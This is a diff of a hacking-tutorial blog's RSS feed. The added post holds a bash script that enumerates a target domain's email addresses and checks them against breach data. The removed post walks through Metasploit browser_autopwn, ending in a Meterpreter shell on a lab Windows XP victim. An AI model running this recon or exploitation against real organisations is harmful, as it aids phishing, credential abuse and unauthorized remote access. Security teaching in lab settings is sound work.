@@ -2,9 +2,62 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
 <channel><title>m3t4lk3y</title><link>https://metalkey.github.io/index.html</link>
 <description>Hacking tutorials + info</description><language>en</language>
-<lastBuildDate>Sat, 22 Oct 2016 22:42:48 +1100</lastBuildDate>
-<pubDate>Sat, 22 Oct 2016 22:42:48 +1100</pubDate>
+<lastBuildDate>Mon, 24 Oct 2016 23:50:44 +1100</lastBuildDate>
+<pubDate>Mon, 24 Oct 2016 23:50:44 +1100</pubDate>
 <atom:link href="https://metalkey.github.io/feed.rss" rel="self" type="application/rss+xml" />
+<item><title>
+Company Email Enumeration + Breached Email Finder
+</title><description><![CDATA[
+
+Enumerating email addresses for a target domain and checking if these emails appear in known breaches can be extremely useful when performing recon.<br>
+This script will use <b><a href="https://hunter.io">hunter.io</a></b> to enumerate domain emails and feed them into <b><a href="https://hacked-emails.com">hacked-emails.com</a></b> to check if they appear in known breaches.<br>
+<br>
+<b>Note:</b> Substitute <b>YOURAPIKEY</b> with your hunter.io API key. This can be obtained by creating a hunter.io account.<br>
+<br>
+<code>
+	<div class="code">
+root@kali:~#	<com>cat emails.sh</com><br>
+		#!/bin/bash<br>
+		rm found-emails.txt<br>
+		rm hacked-emails.txt<br>
+		clear<br>
+		echo -e "\e[92mEnter Target Domain:"<br>
+		echo -e "\e[39m"<br>
+		read hname<br>
+		clear<br>
+		echo -e "[+] Email Recon Started"<br>
+		echo -e "\e[39m"<br>
+		<br>
+		# Email Checks<br>
+		echo "- Enumerating Domain Emails"<br>
+		curl -k -s "https://api.emailhunter.co/v1/search?domain=$hname&api_key=<b>YOURAPIKEY</b>" | grep -Po '"value" :.*?[^\\]",' | cut -d'"' -f4 > found-emails.txt<br>
+		echo "Found the following emails:"<br>
+		cat found-emails.txt<br>
+		echo ""<br>
+		echo "[+] Checking if Emails have been breached"<br>
+		for email in $(cat found-emails.txt);do<br>
+		curl -k -s "https://hacked-emails.com/api?q=$email" | grep '"status":"found"' | cut -d'"' -f8 >> hacked-emails.txt &<br>
+		done<br>
+		wait<br>
+		echo "The following email addresses appear in known breaches:"<br>
+		cat hacked-emails.txt<br>
+		<br>
+		echo -e "\e[39m"<br>
+		echo -e "[*] Please wait..."<br>
+		wait<br>
+		echo -e "[END] Email Recon Complete!"<br>
+		echo -e ""<br>
+
+	</div>
+</code>
+
+<p>Tags: <a href='tag_recon.html'>recon</a></p>
+
+<!-- text end -->
+]]></description><link>https://metalkey.github.io/company-email-enumeration--breached-email-finder.html</link>
+<guid>https://metalkey.github.io/./company-email-enumeration--breached-email-finder.html</guid>
+<dc:creator>metalkey</dc:creator>
+<pubDate>Mon, 24 Oct 2016 23:34:08 +1100</pubDate></item>
 <item><title>
 Installing Wickr on Ubuntu 16.04
 </title><description><![CDATA[
@@ -34,7 +87,7 @@ Installing Wickr on Ubuntu 16.04
 </div>
 </code>
 
-<p>Tags: <a href='tag_Privacy.html'>Privacy</a></p>
+<p>Tags: <a href='tag_Privacy.html'>privacy</a></p>
 
 <!-- text end -->
 ]]></description><link>https://metalkey.github.io/installing-wickr-on-ubuntu-1604.html</link>
@@ -245,6 +298,7 @@ root@metasploitable:/etc/unreal#
 
 
 
+
 <!-- text end -->
 ]]></description><link>https://metalkey.github.io/unrealircd-3281-backdoor-command-execution.html</link>
 <guid>https://metalkey.github.io/./unrealircd-3281-backdoor-command-execution.html</guid>
@@ -401,6 +455,7 @@ root
 
 
 
+
 <!-- text end -->
 ]]></description><link>https://metalkey.github.io/linux-kernel-26-udev-lt-141---local-privilege-escalation-exploit-example.html</link>
 <guid>https://metalkey.github.io/./linux-kernel-26-udev-lt-141---local-privilege-escalation-exploit-example.html</guid>
@@ -538,6 +593,7 @@ If your system is vulnerable, ensure it is patched immediately by upgrading your
 
 
 
+
 <!-- text end -->
 ]]></description><link>https://metalkey.github.io/shellshock-explained--exploitation-tutorial.html</link>
 <guid>https://metalkey.github.io/./shellshock-explained--exploitation-tutorial.html</guid>
@@ -663,6 +719,7 @@ C:\7-ZipPortable>
 
 
 
+
 <!-- text end -->
 ]]></description><link>https://metalkey.github.io/shellter---the-ultimate-tool-for-av-evasion.html</link>
 <guid>https://metalkey.github.io/./shellter---the-ultimate-tool-for-av-evasion.html</guid>
@@ -728,77 +785,4 @@ Higher values can also be set and detailed instructions are available at Null By
 <guid>https://metalkey.github.io/./increasing-the-power-output-of-your-alfa-awus036h.html</guid>
 <dc:creator>metalkey</dc:creator>
 <pubDate>Fri, 01 Jul 2016 15:11:09 +1000</pubDate></item>
-<item><title>
-Metasploit Browser Autopwn – Windows XP SP2
-</title><description><![CDATA[
-<strong>Attacker:</strong> Kali Linux<br>
-<strong>Victim:</strong> Windows XP SP3 (Java 6u25, IE6)<br></p>
-
-<h2>Step 1 – Starting the Browser Autopwn Server</h2>
-
-<p>Run msfconsole, load the browser_autopwn module and set all required options.<br>
-<code></p>
-
-<div class="code">
-root@kali:~$ <com>msfconsole</com><br>
-msf > <com>use auxiliary/server/browser_autopwn</com><br>
-msf auxiliary(browser_autopwn) > <com>set LHOST 192.168.1.12</com><br>
-msf auxiliary(browser_autopwn) > <com>set SRVPORT 80</com><br>
-msf auxiliary(browser_autopwn) > <com>set URIPATH /</com><br>
-msf auxiliary(browser_autopwn) > <com>run</com><br>
-<br>
-[*] Starting exploit modules on host 192.168.1.12...<br>
-[*] Server started.
-</div>
-
-<p></code>
-The Browser Autopwn Server is now running and waiting for victims to browse to the url http://192.168.1.12<br></p>
-
-<h2>Step 2 – Pwning the Victim</h2>
-
-<p>On your Windows XP test machine (victim), browse to http://192.168.1.12.<br>
-This will trigger the browser_autopwn module to serve the appropriate exploit and launch a meterpreter session.<br>
-<code></p>
-
-<div class="code">
-[*] Meterpreter session 1 opened (192.168.1.12:7777 -> <br>
-192.168.1.13:1045) at 2015-07-25 05:08:06 -0400<br>
-...<br>
-msf auxiliary(browser_autopwn) ><com> sessions -i 1</com><br>
-[*] Starting interaction with 1...meterpreter ><com> shell</com><br>
-Microsoft Windows XP [Version 5.1.2600]<br>
-(C) Copyright 1985-2001 Microsoft Corp.<br>
-C:\Documents and Settings\IEUser\Desktop><com>echo %USERNAME%</com><br>
-Victim<br>
-<br>
-C:\Documents and Settings\IEUser\Desktop><com>ipconfig</com><br>
-Windows IP Configuration<br>
-<br>
-Ethernet adapter Local Area Connection:<br>
-<br>
-Connection-specific DNS Suffix . : Home<br>
-IP Address. . . . . . . . . . . . : 192.168.1.13<br>
-Subnet Mask . . . . . . . . . . . : 255.255.255.0<br>
-Default Gateway . . . . . . . . . : 192.168.1.1<br>
-<br>
-C:\Documents and Settings\IEUser\Desktop><br>
-</div>
-
-<p></code>
-You now have shell access to the Windows XP SP3 Victim with the same access as the user who navigated to the exploit url.<br></p>
-
-<h2>Solution</h2>
-
-<p>Keep your software fully updated (e.g. Windows, Web Browsers, Java, etc…) and uninstall unused applications.</p>
-
-<p>Tags: <a href='tag_metasploit.html'>metasploit</a></p>
-
-
-
-
-<!-- text end -->
-]]></description><link>https://metalkey.github.io/metasploit-browser-autopwn---windows-xp-sp2.html</link>
-<guid>https://metalkey.github.io/./metasploit-browser-autopwn---windows-xp-sp2.html</guid>
-<dc:creator>metalkey</dc:creator>
-<pubDate>Fri, 01 Jul 2016 15:09:53 +1000</pubDate></item>
 </channel></rss>
